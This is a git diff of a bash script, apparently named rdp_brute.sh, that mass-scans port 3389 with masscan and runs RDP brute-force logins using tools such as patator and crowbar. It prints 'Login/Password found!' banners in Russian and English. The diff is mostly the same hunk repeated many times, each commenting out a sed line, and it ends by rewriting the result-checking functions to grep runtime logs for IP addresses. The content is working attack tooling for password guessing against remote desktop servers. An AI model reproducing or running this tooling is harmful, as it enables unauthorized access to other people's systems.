-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18866,7 +18870,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18911,7 +18915,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -18956,7 +18960,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19001,7 +19005,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19047,7 +19051,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19092,7 +19096,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19138,7 +19142,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19184,7 +19188,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19229,7 +19233,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19275,7 +19279,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19321,7 +19325,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19367,7 +19371,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19413,7 +19417,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19459,7 +19463,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19505,7 +19509,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19550,7 +19554,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19595,7 +19599,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19641,7 +19645,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19686,7 +19690,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19731,7 +19735,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19776,7 +19780,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19821,7 +19825,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19866,7 +19870,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19912,7 +19916,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -19957,7 +19961,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -20003,7 +20007,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -20049,7 +20053,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -20087,7 +20091,7 @@ trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
-sed 's/$/\/32/' open3389 > open
+#sed 's/$/\/32/' open3389 > open
 
 
 echo -e "$green*Hosts open RDP port written to the file $red $PWD/open3389 $colorbase"
@@ -20321,11 +20325,12 @@ fi
 ######################################TESTRESULTRU#######################################
 TESTRESULTRU ()
 {
-cat patator > all_results
-if grep -E 'RDP-SUCCESS|host|login|password' all_results;
+clear
+cat $PWD/Results/RUNTIME.log | grep -E '([0-9]{1,3}[\.]){3}[0-9]{1,3}'> all_results
+if grep -E '([0-9]{1,3}[\.]){3}[0-9]{1,3}' all_results;
 	then
 	echo ""
-	#cat crowbar.out | grep 'RDP-SUCCESS'
+	#cat all_results | grep -E '([0-9]{1,3}[\.]){3}[0-9]{1,3}'
 	echo ""
  echo -e "$colorbase                          +---------------------------+"
  echo -e "$colorbase                          |$red   Логин/Пароль найден!    $colorbase|";
@@ -20352,11 +20357,12 @@ fi
 ######################################TESTRESULTEN######################################
 TESTRESULTEN ()
 {
-cat patator > all_results
-if grep -E 'RDP-SUCCESS|host|login|password' all_results;
+clear
+cat $PWD/Results/RUNTIME.log | grep -E '([0-9]{1,3}[\.]){3}[0-9]{1,3}'> all_results
+if grep -E 'INFO - 0|([0-9]{1,3}[\.]){3}[0-9]{1,3}|:[*]:' all_results;
 	then
 	echo ""
-	#cat crowbar.out | grep 'RDP-SUCCESS'
+	#cat all_results | grep -E 'INFO - 0|([0-9]{1,3}[\.]){3}[0-9]{1,3}|:[*]:'
  echo -e "$colorbase                          +-------------------------+"
  echo -e "$colorbase                          |$red  Login/Password found!  $colorbase|";
  echo -e           "                          +-------------------------+$red"
